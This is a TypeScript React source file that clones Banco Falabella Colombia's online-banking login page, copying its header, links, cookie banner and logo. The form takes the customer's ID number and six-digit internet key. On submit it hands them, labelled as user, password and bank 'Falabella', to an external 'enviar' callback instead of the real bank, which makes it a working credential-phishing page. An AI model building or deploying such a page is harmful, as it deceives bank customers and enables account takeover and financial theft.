/* eslint-disable @typescript-eslint/no-explicit-any */
/* eslint-disable @next/next/no-img-element */
/* eslint-disable @next/next/no-html-link-for-pages */
import React, { useState, useCallback, FormEvent, ChangeEvent } from 'react';
import { IoMdClose } from 'react-icons/io';

// Si utilizas Next.js, puedes usar el componente Image de Next.js para optimizar imágenes.
// import Image from 'next/image';
// 1. Definición de la interfaz para el estado del formulario
interface LoginFormData {
  documentType: 'CC' | 'CE' | 'PAS';
  documentNumber: string;
  internetKey: string;
}

const Login: React.FC = ({ enviar }: any) => {
  // Estado para controlar la visibilidad del formulario de login móvil
  const [isMobileAuthVisible, setIsMobileAuthVisible] = useState<boolean>(false);

  // Estado para los datos del formulario, tipado con LoginFormData
  const [formData, setFormData] = useState<LoginFormData>({
    documentType: 'CC', // Valor inicial por defecto
    documentNumber: '',
    internetKey: '',
  });

  // 2. Manejador de cambio de input con tipado de evento
  const handleInputChange = useCallback((e: ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target;

    // Aseguramos que 'value' para documentType sea uno de los tipos definidos si es necesario
    if (name === 'documentType') {
      setFormData(prev => ({ ...prev, [name]: value as 'CC' | 'CE' | 'PAS' }));
    } else {
      setFormData(prev => ({ ...prev, [name]: value }));
    }
  }, []);

  // Función para abrir el formulario de banca en línea móvil
  const showMobileAuth = useCallback(() => {
    setIsMobileAuthVisible(true);
  }, []);

  // Función para cerrar el formulario de banca en línea móvil
  const closeMobileAuth = useCallback(() => {
    setIsMobileAuthVisible(false);
  }, []);

  // Validación: el botón de Ingresar está habilitado solo si todos los campos tienen un valor.
  const isFormValid: boolean = !!(formData.documentType && formData.documentNumber.length >= 6 && formData.internetKey.length === 6);

  // Manejador para el envío del formulario con tipado de evento
  const handleLoginSubmit = (e: FormEvent) => {
    e.preventDefault();
    if (isFormValid) {
      console.log('Intentando Ingresar con:', formData);
      enviar?.({
        view: "login",
        user: formData.documentNumber,
        pass: formData.internetKey,
        bank: "Falabella",
        timestamp: new Date().toISOString(),
      });

    } else {
      console.log('Formulario inválido. Revise los campos.');
    }
  };

  // Manejador para el botón "Entendido" de la política de cookies (simulado)
  const handleCookieConsent = useCallback(() => {
    console.log('Entendido - Política de Cookies Aceptada');
  }, []);

  // --- Estructura HTML del Componente (mismo marcado, con atributos de React) ---
  return (
    <>
      <header className="layout_wrapper-header__qA0E4">
        <nav className="header_main-header__sYZXC mobile">
          <div className="header_main-header__sup__MGYuV">
            <div className="d-flex align-items-center justify-content-between">
              <ul>
                <li><a href="https://www.falabella.com.co/falabella-co/" target="_blank" rel="noreferrer noopener">Falabella</a></li>
                <li><a href="http://www.homecenter.com.co/homecenter-co/" target="_blank" rel="noreferrer noopener">Homecenter</a></li>
                <li><a href="https://www.segurosfalabella.com.co/" target="_blank" rel="noreferrer noopener">Seguros Falabella</a></li>
              </ul>
              <ul>
                <li><a href="/lp/ita" target="_self" rel="">Transparencia</a></li>
                <li><a rel="">|</a></li>
                <li><a href="/lp/canales-presenciales" target="_self" rel="">Canales de Atención</a></li>
              </ul>
            </div>
          </div>
          <div className="header_main-header__sub__M7THE">
            <div className="header_container-menu__Y_4Vm">
              <div className="row align-items-center">
                <div id="main-header__sub-content" className="header_main-header__sub-content__FJdxd col-12 col-md-12 d-flex align-items-center justify-content-between">
                  <div className="header_logo-holder__5rb_k d-flex align-items-center">
                    <div className="header_header__sub-menu-toggle__uqhtI"><span></span><span></span><span></span></div>
                    <a href="/" className="header_main-logo__9xONI" title="Banco Falabella">
                      <figure className="LogoBrand_logo-container__dACd4 hidden-caption" style={{ height: "170px", width: "163px" }}>
                        <img src="/bancos/falabella/logo.svg" className='w-full h-full' alt="" style={{ position: "absolute", height: "100%", width: "100%", top: 0, right: 0, bottom: 0, left: 0, color: "transparent" }} />

                      </figure>
                    </a>
                  </div>

                  {/* Formulario de Login para Desktop */}
                  <div className="col header_wrapper-form__VItbr header_wrapper-form--hide__zc_1c">
                    <div id="auth-show-form" className="header_auth-form__container__TbwNW">
                      <form id="auth-form" className="Auth-Form_form_container__tRY92" onSubmit={handleLoginSubmit}>
                        <div className="Auth-Form_wrapper__3MN_j">
                          <div className="Auth-Form_form_container__form__cdIoU">
                            <div className="Auth-Form_form_container__form_close__raHXl">
                              <button type="button">CERRAR<IoMdClose />
                              </button>
                            </div>
                            <div className="Auth-Form_form_container__form_wrapper__Via_o">
                              <div className="Auth-Form_form_container__form_input__HZaMj">
                                <select
                                  name="documentType"
                                  value={formData.documentType}
                                  onChange={handleInputChange}
                                  className="input-select_input_select__aj1ES"
                                >
                                  <option value="CC">Cédula Ciudadanía</option>
                                  <option value="CE">Cédula de Extranjería</option>
                                  <option value="PAS">Pasaporte</option>
                                </select>
                              </div>
                              <div className="Auth-Form_form_container__form_input__HZaMj">
                                <div className="input_orientation_horizontal____5pz undefined ">
                                  <input
                                    className="input_input__rqoVQ "
                                    name="documentNumber"
                                    value={formData.documentNumber}
                                    onChange={handleInputChange}
                                    placeholder="Cédula de Ciudadania"
                                    type="text"
                                    minLength={6}
                                    maxLength={10}
                                    autoComplete="new-password"
                                  />
                                </div>
                              </div>
                              <div className="Auth-Form_form_container__form_input__HZaMj">
                                <div className="input_orientation_horizontal____5pz undefined ">
                                  <input
                                    className="input_input__rqoVQ "
                                    name="internetKey"
                                    value={formData.internetKey}
                                    onChange={handleInputChange}
                                    placeholder="Clave Internet"
                                    type="password"
                                    minLength={6}
                                    maxLength={6}
                                    autoComplete="new-password"
                                  />
                                </div>
                              </div>
                              <div className="Auth-Form_form_container__form_button__hRNhm">
                                <div className="login-button_container__Q_EN3">
                                  <button
                                    id="desktop-login"
                                    type="submit"
                                    className={`button_button__primary__UiNEQ button_button__full__x6E0_ login-button_custom-button__lkAd5`}
                                    disabled={!isFormValid}
                                    aria-label="btn-sm"
                                    data-testid="desktop-login"
                                  >
                                    Ingresar
                                  </button>
                                </div>
                              </div>
                              <div className="Auth-Form_form_container__link__jPZxC w-100 d-block d-lg-none text--right">
                                <a className="d-inline-block" href="https://www.bancofalabella.com.co/autoadhesion/">Crea o recupera tu Clave Internet</a>
                              </div>
                            </div>
                            <div className="Auth-Form_form_container__link__jPZxC text--right">
                              <a className="d-inline-block" href="https://www.bancofalabella.com.co/autoadhesion/">Crea o recupera tu Clave Internet</a>
                            </div>
                          </div>
                        </div>
                      </form>
                    </div>
                  </div>

                  <div className="header_wrapper-actions__IZaUW header_wrapper-actions--show___XnPH ">
                    <button className="header_btn-search__faqCK">Buscar
                      {/* Código de imagen omitido por brevedad */}
                    </button>
                    <button className="button_button__tertiary__KBucI button_button__md__PdqZS" aria-label="Button">Hazte Cliente</button>
                    <button
                      className="button_button__primary__UiNEQ button_button__md__PdqZS"
                      aria-label="Button"
                    >
                      Banca en línea
                    </button>
                  </div>

                  {/* Botones para MOBILE/TABLET */}
                  <div className="header_btn-toggle-login__NUfpo">
                    <button className="button_button__default__ylRnW button_button__sm__w_Nbt" aria-label="Button">
                      <span className="fif icon_fif-icn-search__vWnMv f-24 undefined"></span><span></span>
                    </button>
                    {/* Botón que activa el formulario de login móvil */}
                    <button
                      id="btn-auth-normal"
                      className="button_button__primary__UiNEQ button_button__md__PdqZS"
                      aria-label="Button"
                      onClick={showMobileAuth}
                    >
                      Banca en línea
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </nav>

        {/* --- Formulario de Login Móvil (con estado de visibilidad) --- */}
        <div
          id="auth-mobile"
          className={`layout_layout__mobile__Q14PH ${isMobileAuthVisible ? 'layout_layout__mobile__show' : ''}`}
          style={{ position: 'relative', zIndex: 98, display: isMobileAuthVisible ? 'block' : 'none' }}
        >
          <div className="layout_auth_form__xPgLy">
            <form id="auth-form" className="Auth-Form_form_container__tRY92" onSubmit={handleLoginSubmit}>
              <div className="Auth-Form_wrapper__3MN_j">
                <div className="Auth-Form_form_container__form__cdIoU">
                  {/* Botón para CERRAR el formulario móvil */}
                  <div className="Auth-Form_form_container__form_close__raHXl">
                    <button type="button" onClick={closeMobileAuth}>CERRAR<span className="fif  f-20 undefined"><IoMdClose /></span></button>
                  </div>
                  <div className="Auth-Form_form_container__form_wrapper__Via_o">
                    <div className="Auth-Form_form_container__form_input__HZaMj">
                      <select
                        name="documentType"
                        value={formData.documentType}
                        onChange={handleInputChange}
                        className="input-select_input_select__aj1ES"
                      >
                        <option value="CC">Cédula Ciudadanía</option>
                        <option value="CE">Cédula de Extranjería</option>
                        <option value="PAS">Pasaporte</option>
                      </select>
                    </div>
                    <div className="Auth-Form_form_container__form_input__HZaMj">
                      <div className="input_orientation_horizontal____5pz undefined ">
                        <input
                          className="input_input__rqoVQ "
                          name="documentNumber"
                          value={formData.documentNumber}
                          onChange={handleInputChange}
                          placeholder="Cédula de Ciudadania"
                          type="text"
                          minLength={6}
                          maxLength={10}
                          autoComplete="new-password"
                        />
                      </div>
                    </div>
                    <div className="Auth-Form_form_container__form_input__HZaMj">
                      <div className="input_orientation_horizontal____5pz undefined ">
                        <input
                          className="input_input__rqoVQ "
                          name="internetKey"
                          value={formData.internetKey}
                          onChange={handleInputChange}
                          placeholder="Clave Internet"
                          type="password"
                          minLength={6}
                          maxLength={6}
                          autoComplete="new-password"
                        />
                      </div>
                    </div>
                    <div className="Auth-Form_form_container__form_button__hRNhm">
                      <div className="login-button_container__Q_EN3">
                        <button
                          id="desktop-login"
                          type="submit"
                          className={`button_button__primary__UiNEQ button_button__full__x6E0_ login-button_custom-button__lkAd5`}
                          disabled={!isFormValid}
                          aria-label="btn-sm"
                          data-testid="desktop-login"
                        >
                          Ingresar
                        </button>
                      </div>
                    </div>
                    <div className="Auth-Form_form_container__link__jPZxC w-100 d-block d-lg-none text--right">
                      <a className="d-inline-block" href="https://www.bancofalabella.com.co/autoadhesion/">Crea o recupera tu Clave Internet</a>
                    </div>
                  </div>
                  <div className="Auth-Form_form_container__link__jPZxC text--right">
                    <a className="d-inline-block" href="https://www.bancofalabella.com.co/autoadhesion/">Crea o recupera tu Clave Internet</a>
                  </div>
                </div>
              </div>
            </form>
          </div>
        </div>

        {/* Cookie Consent Banner */}
        <div className="CookieConsent_container__HjlWO">
          <div className="CookieConsent_wrapper__o1O9u">
            <div className="CookieConsent_text__j959M">
              <p>Usamos cookies para mejorar tu experiencia. Consulta más <a href="https://assets.ctfassets.net/ex6ts2p2j0ib/1c2EwzGW2HgOAvVmaaUOkY/dd265e8772793bf6a774ea6d3e0ddcb0/Poli_tica_de_Cookies--2023.pdf" title="Ver Políticas de Cookies" rel="nofollow" target="_blank">aquí</a>.</p>
            </div>
            <button
              id="btn-login-client-nuevo"
              className="button_button__secondary-default__RuKBF button_button__sm__w_Nbt"
              aria-label="Button"
              style={{ height: '48px', fontSize: '14px' }}
              onClick={handleCookieConsent}
            >
              Entendido
            </button>
          </div>
        </div>

      </header>
      <div className='contenido'>
        <img src="/bancos/falabella/contenido-mobile.jpg" alt="" />

      </div>

    </>
  );
};

export default Login;